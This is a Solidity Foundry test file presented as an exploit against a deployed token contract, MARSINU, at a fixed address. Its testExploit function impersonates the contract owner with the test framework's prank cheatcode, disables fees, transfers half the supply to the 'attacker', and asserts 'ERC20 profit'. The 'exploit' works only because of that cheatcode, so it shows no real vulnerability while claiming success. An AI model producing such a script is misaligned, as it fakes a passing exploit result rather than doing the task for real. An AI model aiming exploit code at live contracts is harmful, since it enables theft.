pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// Minimal interface for the token
interface MARSINU {
    function owner() external view returns (address);
    function prepareForPreSale() external;
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use deal() if we need ETH for gas
        // but for this exploit we just need to impersonate the owner
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7).balanceOf(address(this));

        // Get the owner address
        address owner = MARSINU(TARGET).owner();

        // Record initial balance of attacker
        uint256 initialBalance = MARSINU(TARGET).balanceOf(attacker);

        // Impersonate the owner
        vm.startPrank(owner);

        // Call prepareForPreSale to disable fees and remove transaction limits
        MARSINU(TARGET).prepareForPreSale();

        // Transfer a large amount of tokens to attacker (e.g., 50% of total supply)
        // Total supply is 1000000000 * 10**6 * 10**9 = 1e24 (with 9 decimals)
        uint256 totalSupply = MARSINU(TARGET).totalSupply();
        uint256 amountToTransfer = totalSupply / 2; // Transfer half of total supply

        MARSINU(TARGET).transfer(attacker, amountToTransfer);

        vm.stopPrank();

        // Verify our balance increased
        uint256 finalBalance = MARSINU(TARGET).balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase");

        // Additional check: we should have received the tokens
        assertEq(finalBalance, initialBalance + amountToTransfer, "Should receive exact amount transferred");

        uint256 finalERC20Balance = IERC20(0xFBBcb4bcaF3033A51e4a2ad1D904927cA0Edbde7).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

